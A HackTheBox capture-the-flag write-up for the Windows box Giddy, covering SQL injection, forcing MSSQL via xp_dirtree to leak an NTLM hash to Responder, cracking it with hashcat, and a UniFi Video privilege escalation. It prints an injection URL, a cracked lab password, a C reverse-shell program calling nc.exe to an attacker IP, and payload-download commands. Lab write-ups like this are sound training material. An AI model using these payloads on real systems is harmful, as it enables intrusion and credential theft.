---
title: "HackTheBox Writeup: Giddy"
date: 2019-08-30T01:33:19+02:00
toc: true
showdate: true
tags:
  - hackthebox
  - writeup
  - ctf
---

Giddy was a very nice box, one of those where the path to user is more difficult than escalating privileges, as we'll see. It probably was a little bit easier for me than for some other players because I had already solved Querier some time before touching Giddy, with which it shares the NTLM authentication trigger through xp_dirtree, a very interesting undocumented MSSQL function that allows to list the content of a remote directory, we'll use this to force the database into connecting to our box, thus providing its NTLM hash that we'll crack to login on the system. Root on the other hand is much more straightforward, a local privilege escalation exploit.

![img](/images/giddy-writeup/1.png)

---

## Enumeration

Let's start with a simple classic nmap scan to perform service enumeration (-sV) and to execute the list of default NSE scripts (-sC) and setting a nice speed (-T4). The result is as follows:

![img](/images/giddy-writeup/2.png)

We find two web servers running on ports 80 and 443, and a Windows terminal server on port 3389. While the web server on port 443 provides an invalid SSL certificate making it impossible to connect to it the other port shows nothing but an image of a dog:

![img](/images/giddy-writeup/3.png)

The source code doesn't contain anything interesting either, but from the IIS version, 10.0, we can tell Giddy is running Windows 10 or Windows Server 2016. Let's rungobuster to see if it finds anything interesting:

```shell-session
$ gobuster dir -w SecLists/Discovery/Web-Content/big.txt -t 50 -u http://10.10.10.104 
```

![img](/images/giddy-writeup/4.png)

aspnet_client is a forbidden path as expected, /remote and /mvc are very interesting though. /remote shows a login page for PowerShell Web Access:

![img](/images/giddy-writeup/5.png)

/mvc on the other hand reveals a simple shopping website:

![img](/images/giddy-writeup/6.png)

The website has a page to search for products:

![img](/images/giddy-writeup/7.png)

Thinking a database backend could be behind this I try typing a single quote character in the textbox and see what happens, if the page returns an error the website is vulnerable to SQL injection:

![img](/images/giddy-writeup/8.png)

Surely enough the website is vulnerable and appears to be a test application to practice with SQL injection attacks, plus the error message gives us the name of one of the users on the box: jnogueira. From the developer tools we can see the name of the POST parameter we want to use to attack the web application is called "SearchTerm":

![img](/images/giddy-writeup/9.png)

There is also yet another possible injection point, it being the GET parameter used to switch between categories on the website:

```shell-session
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=28
```

---

## First SQL Injection attempt: sqlmap

Adding a single quote will cause another SQL error signaling its vulnerability. We can use this information to learn more from the database using sqlmap:

```shell-session
$ sqlmap -u http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=28 --dbs
```

![img](/images/giddy-writeup/10.png)

So we can confirm that the Database Management System (DBMS) behind Giddy is Microsoft SQL Server (MSSQL) and we found the names of five databases hosted on the box. If we add an "-a" or "--all" flag to the command above we can retrieve every information sqlmap can find from the database, including the content of all the databases, the current user, current database, passwords, and so on:

![img](/images/giddy-writeup/11.png)

From this part of the output we find out that our current user is called stacy and unfortunately said user isn't part of the DBA (Database Administrator) group so we aren't going to be able to read sensitive information such as passwords, in fact we can see this on another section of the output generated by sqlmap:

![img](/images/giddy-writeup/12.png)

The only content sqlmap is able to dump from the databases consists in the various products available on the website, so nothing interesting.

---

## Second SQL Injection attempt: xp_dirtree + responder + hashcat

However there is something we can do now with the username at hand, just like in Querier, another Windows HTB box, we can force MSSQL to connect to our computer to list the content of a remote directory using an undocumented function called xp_dirtree, MSSQL will try to connect to us using SMB by presenting an authentication LNTMv2 hash, we can grab this hash and crack it to find Stacy's password and login using her account. To do this we need a temporary SMB server to grab the hash for us, Responder can do the job:

```shell-session
$ responder -I tun0
```

This command will start a selection of servers managed by Responder on the network interface used to connect to the HTB labs:

![img](/images/giddy-writeup/13.png)

Now Responder is listening for events and will show us whatever it receives, especially hashes, so it's time to send the special command to the MSSQL database to trigger the authentication attempt from Stacy. The attack works as follow: declare a variable containing our IP addresses, use the xp_dirtree command to list the content of the folder located at our address. The individual commands are these:

```shell-session
SQL> declare @q varchar(99);
SQL> set @q "\\10.10.14.29\test";
SQL> exec master.dbo.xp_dirtree @q;
```

In thte first line we declare an array of 99 characters, so essentially a string called q, which is then assigned the path of a fake folder located on our machine. Lastly, the xp_dirtree command is called to connect to us and this will cause Giddy to send us a hash. These three SQL queries can of course be injected straight from the GET parameter we found vulnerable earlier, and when URL encoded they become this:

```shell-session
/mvc/Product.aspx?ProductSubCategoryId=28;declare%20@q%20varchar(99);set%20@q=%27\\10.10.14.29\test%27;exec%20master.dbo.xp_dirtree%20@q
```

The URL above can be pasted straight in the URL and the result is:

![img](/images/giddy-writeup/14.png)

Now the whole hash can be copied and pasted in a file I called giddy.hash and hashcat is used to crack it using the usual rockyou.txt dictionary. Because the hashing algorithm used for SMB authentication is Net-NTLMv2 we must specify the right mode for hashcat which is 5600, while "-a 0" means we're launching a dictionary attack:

```shell-session
$ hashcat -m 5600 -a 0 --force giddy.hash /usr/share/wordlists/rockyou.txt
```

It takes only a few seconds to have the results back:

![img](/images/giddy-writeup/15.png)

So our credentials are:

```shell-session
User: stacy
Pass: xNnWo6272k7x
```

We can use these to login using the PowerShell Web Interface we found earlier, with these settings:

```shell-session
User: giddy\stacy
Pass: xNnWo6272k7x
Computer Name: giddy
```

This gives us access to a powershell console, and from here we can read user.txt:

![img](/images/giddy-writeup/16.png)

Now it's time to do some local enumeration and we find traces of a program called unifivideo in the documents directory, which is exactly where we start from:

![img](/images/giddy-writeup/17.png)

This is a program used to manage security cameras. A quick trip to exploit-db shows there exists a local privilege escalation vulnerability in [UniFi Video 3.7.3](https://www.exploit-db.com/exploits/43390). The exploit works by abusing the misconfigured default permissions of unifi-videos' installation directory: C:\ProgramData\unifi-video:

![img](/images/giddy-writeup/18.png)

---

## Privilege escalation: UniFi Video local exploit

This installation folder inherits permissions from the parent directory instead of overriding them:

```shell-session
c:\ProgramData>icacls unifi-video
unifi-video NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
BUILTIN\Administrators:(I)(OI)(CI)(F)
CREATOR OWNER:(I)(OI)(CI)(IO)(F)
BUILTIN\Users:(I)(OI)(CI)(RX)
BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)
```

The output from *icacls* shows that every user on the system has full access on the directory (F), allowing anyone to read and write files at their own pleasure. This is a security issue because in this directory resides a service that is run as NT Authority/SYSTEM: avService.exe. When the service is being started or stopped it tries to execute another program called taskkill.exe from the same directory, which oddly enough does not exist by default. What this means is that we can rename any binary of our choice into taskkill.exe, place it into the unifi-video folder, run avService.exe, and our malicious program will be run as NT Authority/SYSTEM. To test this I'm going to compile a simple program that executes nc.exe to start a reverse shell:

```cpp
#include <stdlib.h>

int main()
{
	system("nc.exe -e cmd.exe 10.10.14.29 9999");
	return 0;
}
```

I used mingw32 to compile it from my Linux box:

```shell-session
$ i686-w64-mingw32-gcc -o giddy.exe giddy.c
```

And downloaded both nc.exe and the test executable on to Giddy with the Invoke-WebRequest Powershell cmdlet:

```powershell
$ Invoke-WebRequest "http://10.10.14.29:9090/nc.exe" -OutFile "./nc.exe"
```

Or, *iwr* for short:

```powershell
$ iwr "http://10.10.14.29:9090/giddy.exe" -outfile "./taskkill.exe"
```

Stopping the service is all we need to trigger the exploit:

```shell-session
$ stop-service -name "Ubiquiti Unifi Video"
```

![img](/images/giddy-writeup/19.png)

We receive a connection from Giddy and we are now NT Authority/SYSTEM:

![img](/images/giddy-writeup/20.png)












